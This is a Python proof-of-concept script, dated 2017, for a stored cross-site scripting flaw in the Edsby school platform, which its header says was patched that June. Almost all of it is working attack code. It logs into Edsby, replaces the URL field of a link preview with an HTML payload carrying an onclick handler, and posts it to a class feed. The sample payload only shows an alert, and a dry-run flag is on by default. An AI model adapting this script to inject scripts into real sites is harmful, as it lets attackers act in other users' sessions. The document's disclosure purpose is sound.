"""
    Edsby Cross-Site Scripting Proof-of-Concept
    Allows for the insertion of any arbitrary javascript payload
    into the current user's session.

    Note that this is purely for record keeping purposes, as this vulnerability
    has been patched in all Edsby versions as of early June 2017.

    (c) 2017 Charlton Trezevant

    Disclaimer: The Edsby trademark and brand are property of CoreFour, Inc. This
    software is unofficial and not supported by CoreFour in any way. I do not work for CoreFour.
"""

import sys, json
sys.path.insert(0, './lib')
import requests
from edsby import Edsby

config = {
    'dry_run': True,
    'host': 'foo.edsby.com',
    'username': ' ',
    'password': ' ',
    'classNID': ' ',
    'fake_url': 'https://www.google.com/',
    'payload': '</a><a onclick="alert(\'Whoops.\')">click me</a><a>'
}

print 'Logging in...'
edsby = Edsby(host=config['host'], username=config['username'], password=config['password'])
print 'Done.' if isinstance(edsby, Edsby) else 'Login failed!'

print '\nConstructing message with payload: \n\t' + config['payload']

meta = edsby.scrapeURLMetadata(config['classNID'], config['fake_url'])
meta = edsby.formatURLMetadata(meta)
meta['url'] = config['payload']
print json.dumps(meta) if config['dry_run'] is True else ''

print '\nPosting in ' + str(config['classNID']) + '...'

message = {
            'text': 'this is a test.',
            'url': json.dumps(meta),
            'pin': 8,
            'nodetype': 4,
            'node_subtype': 0,
            'filedata': '',
            'files': '',
}

print 'Edsby responded with: '
print json.dumps(edsby.postMessageInClassFeed(config['classNID'], message)) if config['dry_run'] is False else '\t*** dry_run enabled, didn\'t post: ' + json.dumps(message)
print 'Finished.\n'
